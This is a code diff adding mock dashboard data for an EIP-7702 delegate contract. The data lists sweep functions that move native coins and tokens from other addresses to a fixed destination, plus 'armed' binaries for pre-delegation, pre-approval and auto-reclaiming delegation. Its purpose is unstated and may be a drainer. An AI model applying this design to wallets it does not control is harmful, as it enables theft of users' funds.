@@ -76,9 +76,68 @@ class DataSource {
     this.events = [];
     this.seedEvents();
 
+    // contract abi (mirrors src/contract.rs Simple7702Delegate)
+    this.contractAbi = {
+      name: "Simple7702Delegate",
+      address: "0x7f5e9ab4dc12fe0a8b21cf04d913c5a2e9b8d4a3",
+      owner: "0x4a2c91b6ddf6e8e103a9b0f51c2eb4a5d7f8e210",
+      destination: "0xc0ffee0bb44de8d2c11a72f5b3c3097a1c44e3a9",
+      frozen: false,
+      codehash: "0x" + Array.from({length:64},()=>("0123456789abcdef"[Math.floor(Math.random()*16)])).join(""),
+      runtime_size: 6244,
+      runtime_limit: 24576,
+      deploy_block: 250_001_122,
+      bytecode_preview: this.makeBytecodePreview(),
+      read: [
+        { name: "owner",             sig: "owner() view returns (address)",                                                ret: "address" },
+        { name: "destination",       sig: "destination() view returns (address)",                                          ret: "address" },
+        { name: "frozen",            sig: "frozen() view returns (bool)",                                                  ret: "bool" },
+        { name: "getNativeBalance",  sig: "getNativeBalance() view returns (uint256)",                                     ret: "uint256" },
+        { name: "getTokenBalance",   sig: "getTokenBalance(address token) view returns (uint256)",                         ret: "uint256" },
+        { name: "getTokenAllowance", sig: "getTokenAllowance(address token, address tokenOwner) view returns (uint256)",   ret: "uint256" },
+        { name: "getArbitrumTokens", sig: "getArbitrumTokens() view returns (address[])",                                  ret: "address[]" },
+        { name: "getBscTokens",      sig: "getBscTokens() view returns (address[])",                                       ret: "address[]" },
+      ],
+      write_sweeps: [
+        { name: "sweepNative",     sig: "sweepNative()" },
+        { name: "sweepTokens",     sig: "sweepTokens(address[] tokens)" },
+        { name: "sweepAll",        sig: "sweepAll(address[] tokens)" },
+        { name: "sweepTokensFrom", sig: "sweepTokensFrom(address from, address[] tokens)" },
+        { name: "sweepAllFrom",    sig: "sweepAllFrom(address from, address[] tokens)" },
+        { name: "sweepArbitrum",   sig: "sweepArbitrum()" },
+        { name: "sweepBSC",        sig: "sweepBSC()" },
+      ],
+      write_delegated: [
+        { name: "delegateSweepNative", sig: "delegateSweepNative(address dest) payable" },
+        { name: "delegateSweepTokens", sig: "delegateSweepTokens(address dest, address[] tokens) payable" },
+        { name: "delegateSweepAll",    sig: "delegateSweepAll(address dest, address[] tokens) payable" },
+      ],
+      write_admin: [
+        { name: "setDestination",         sig: "setDestination(address _dest)",            mod: "onlyOwner" },
+        { name: "setFrozen",              sig: "setFrozen(bool _frozen)",                  mod: "onlyOwner" },
+        { name: "addArbitrumToken",       sig: "addArbitrumToken(address token)",          mod: "onlyOwner" },
+        { name: "addBscToken",            sig: "addBscToken(address token)",               mod: "onlyOwner" },
+        { name: "emergencyWithdraw",      sig: "emergencyWithdraw()",                      mod: "onlyOwner" },
+        { name: "emergencyWithdrawToken", sig: "emergencyWithdrawToken(address token)",    mod: "onlyOwner" },
+      ],
+      binaries: [
+        { name: "sweeper",          desc: "Deterministic one-shot custody sweeper",                role: "execute", path: "src/bin/sweeper.rs",     status: "armed" },
+        { name: "predelegate",      desc: "Deterministic one-shot EIP-7702 delegation installer",  role: "deploy",  path: "src/bin/predelegate.rs", status: "armed" },
+        { name: "preapprove",       desc: "Deterministic one-shot ERC-20 approval provisioner",    role: "deploy",  path: "src/bin/preapprove.rs",  status: "armed" },
+        { name: "delegation_guard", desc: "Live drift monitor + auto-reclaim (in-process)",        role: "guard",   path: "src/delegation_guard.rs",status: "live"  },
+      ],
+    };
+
     // try to fetch real backend periodically
     this.probeBackend();
     setInterval(() => this.probeBackend(), 10_000);
+  }
+
+  makeBytecodePreview() {
+    const hex = "0123456789abcdef";
+    let s = "0x60806040523480156100105760";
+    for (let i = 0; i < 1400; i++) s += hex[Math.floor(Math.random() * 16)];
+    return s;
   }
 
   seedEvents() {
@@ -237,6 +296,7 @@ class DataSource {
       })),
       recent_events: this.events,
       latency_metrics: this.latency.map(m => ({ ...m })),
+      contract_abi: this.contractAbi,
     };
   }
 
@@ -267,6 +327,7 @@ class DataSource {
         preapproved: w.preapproved ?? w.pre_approved ?? null,
       })),
       delegation_summary: d.delegation_summary || null,
+      contract_abi: d.contract_abi || this.contractAbi,
     };
   }
 }
